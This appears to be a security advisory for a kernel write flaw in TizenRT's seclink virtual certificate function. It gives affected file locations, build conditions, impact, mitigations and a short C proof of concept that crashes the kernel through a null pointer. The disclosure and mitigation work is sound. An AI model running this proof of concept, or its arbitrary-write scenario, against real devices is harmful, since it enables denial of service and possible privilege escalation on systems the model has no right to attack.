## SEC-ADV-tizenrt-seclink-virtual-getcert-kernel-write

### Summary
`virtual_hal_get_certificate` copies data into a caller-supplied buffer without validating the pointer. In protected builds where `/dev/seclink` is world-writable and ioctl parameters are not copied/validated, an unprivileged app can direct the kernel to write to an arbitrary address or crash.

### Affected Component
`TizenRT/os/se/virtual/hal_virtual.c:306` (`virtual_hal_get_certificate`), reachable through `TizenRT/os/drivers/seclink/seclink_drv_auth.c:86` and `TizenRT/os/drivers/seclink/seclink_drv.c:124`.

### Impact
Local kernel memory corruption or kernel crash in protected builds. This can lead to denial of service or, with careful targeting, privilege escalation. (CVSS v3.1 8.2 AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

### Conditions for Vulnerability
- `CONFIG_BUILD_PROTECTED=y` (user/kernel separation enabled).
- `CONFIG_SE_VIRTUAL=y` with seclink enabled (`CONFIG_SECURITY_LINK_DRV=y`, `CONFIG_SECURITY_LINK=y`).
- `/dev/seclink` registered with mode `0666` (`TizenRT/os/drivers/seclink/seclink_drv.c:199`).
- Unprivileged user task can call `sl_get_certificate` or invoke `ioctl` on `/dev/seclink`.

### Attack Scenario
An unprivileged app calls `sl_get_certificate` with a crafted `hal_data` where `data` points to a kernel address (or an invalid address). The kernel executes `memcpy(cert_out->data, ...)` without pointer validation and writes into that address, corrupting kernel state or triggering a fault.

### Affected Versions
TizenRT repository snapshot in this workspace. Confirmed in protected build configs such as `TizenRT/build/configs/imxrt1020-evk/loadable_elf_apps/defconfig` (enables `CONFIG_BUILD_PROTECTED`, `CONFIG_SE_VIRTUAL`, and seclink).

### Mitigations
- Validate and copy user pointers at the syscall/ioctl boundary (copyin/copyout), rejecting kernel-space pointers.
- Restrict `/dev/seclink` permissions to privileged tasks only.
- Disable `CONFIG_SE_VIRTUAL` in protected builds or harden virtual HAL APIs to allocate and validate output buffers.

### Proof of Concept (user app)
The following causes a kernel fault in protected builds by passing an invalid pointer for `cert_out.data`:

```c
#include <tinyara/seclink.h>
#include <tinyara/security_hal.h>

int main(void) {
    sl_ctx hnd;
    hal_data cert = {0};

    if (sl_init(&hnd) != SECLINK_OK) {
        return -1;
    }

    cert.data = (void *)0x0; /* invalid pointer to trigger kernel fault */
    cert.data_len = 8;

    /* Triggers virtual_hal_get_certificate -> memcpy(cert_out->data, ...) */
    sl_get_certificate(hnd, 0, &cert);

    return 0;
}
```

### Credits
Identified by SecMate automated analysis and validated during manual triage.
